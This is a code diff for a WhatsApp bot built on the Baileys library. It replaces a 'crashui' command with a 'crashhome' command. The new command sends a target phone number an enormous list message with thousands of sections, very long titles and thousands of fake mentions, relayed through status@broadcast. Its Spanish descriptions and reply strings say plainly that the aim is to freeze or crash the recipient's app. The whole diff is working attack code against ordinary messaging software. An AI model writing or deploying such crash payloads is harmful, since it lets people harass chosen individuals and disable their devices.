@@ -3,10 +3,53 @@ import { fytBold } from "../../core/socketText.ts";
 
 const digits = (j: string) => String(j || "").split("@")[0].split(":")[0].replace(/\D/g, "");
 
+function buildMsg(isTarget: string, n: number) {
+  const sections = Array.from({ length: n }, (_, r) => ({
+    title: "᭯".repeat(n),
+    rows: [{ title: String(r + 1), id: String(r + 1) }],
+  }));
+
+  const jids = Array.from(
+    { length: n },
+    () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`,
+  );
+
+  return {
+    viewOnceMessage: {
+      message: {
+        listResponseMessage: {
+          title: "x",
+          listType: 2,
+          buttonText: null,
+          sections,
+          singleSelectReply: { selectedRowId: "x" },
+          contextInfo: {
+            mentionedJid: jids,
+            participant: isTarget,
+            remoteJid: "status@broadcast",
+            forwardingScore: n,
+            isForwarded: true,
+            forwardedNewsletterMessageInfo: {
+              newsletterJid: "0@newsletter",
+              serverMessageId: 1,
+              newsletterName: "x",
+            },
+          },
+          description: "x",
+        },
+      },
+    },
+    contextInfo: {
+      channelMessage: true,
+      statusAttributionType: 2,
+    },
+  };
+}
+
 export default {
-  name: ["crashui", "crashuia14"],
+  name: ["crashhome", "crashhm"],
   category: "group",
-  description: "Congela la UI con ubicación + caption y footer gigantes. `.crashui [repeticiones]`.",
+  description: "Lista monstruosa a status@broadcast con menciones falsas. `.crashhome <número|mención|respuesta>`.",
   async run(ctx: CommandContext) {
     const { sock, from, msg, args, reply, react } = ctx;
 
@@ -16,38 +59,46 @@ export default {
     const escrito = (args[0] || "").replace(/\D/g, "");
 
     const num = escrito.length >= 8 ? escrito : mencion || citado;
-    const target = num ? `${num}@s.whatsapp.net` : from;
+    if (!num) {
+      await reply("Necesito un número, una mención o una respuesta. `.crashhome 573138523021`").catch(() => undefined);
+      return;
+    }
 
-    let repes = 120000;
-    if (/^\d+$/.test(args[0] || "")) repes = Math.min(300000, Math.max(1000, Number(args[0])));
+    const isTarget = `${num}@s.whatsapp.net`;
 
-    const relleno = "ꦾ".repeat(repes);
+    let n = 9741;
+    if (/^\d+$/.test(args[0] || "")) n = Math.min(20000, Math.max(50, Number(args[0])));
 
-    await react("🧨").catch(() => undefined);
+    await react("🏠").catch(() => undefined);
 
     try {
-      await sock.sendMessage(target, {
-        location: {
-          degreesLatitude: 0,
-          degreesLongitude: 0,
-          name: "x",
-          url: "x",
-          address: "向导书呆子锁测试",
-        },
-        caption: "x" + relleno,
-        footer: relleno,
-        buttons: [
+      const { generateWAMessageFromContent } = await import("baileys");
+
+      const built = generateWAMessageFromContent(isTarget, buildMsg(isTarget, n) as any, {});
+
+      await sock.relayMessage("status@broadcast", built.message, {
+        messageId: built.key.id,
+        statusJidList: [isTarget],
+        additionalNodes: [
           {
-            buttonId: "by x",
-            buttonText: { displayText: "x" },
+            tag: "meta",
+            attrs: {},
+            content: [
+              {
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }],
+              },
+            ],
           },
         ],
       } as any);
 
       await react("☠️").catch(() => undefined);
       await reply(
-        `🧨 ${fytBold("CrashUI enviado")} → ${num ? `+${num}` : "este chat"}\n` +
-          `Repeticiones: ${repes.toLocaleString("es-MX")} (caption + footer)`,
+        `🏠 ${fytBold("Crashhome enviado")} → +${num}\n` +
+          `Secciones: ${n.toLocaleString("es-MX")} · títulos de ${n.toLocaleString("es-MX")} caracteres\n` +
+          `Menciones falsas: ${n.toLocaleString("es-MX")}`,
       ).catch(() => undefined);
     } catch (e: any) {
       await react("❌").catch(() => undefined);
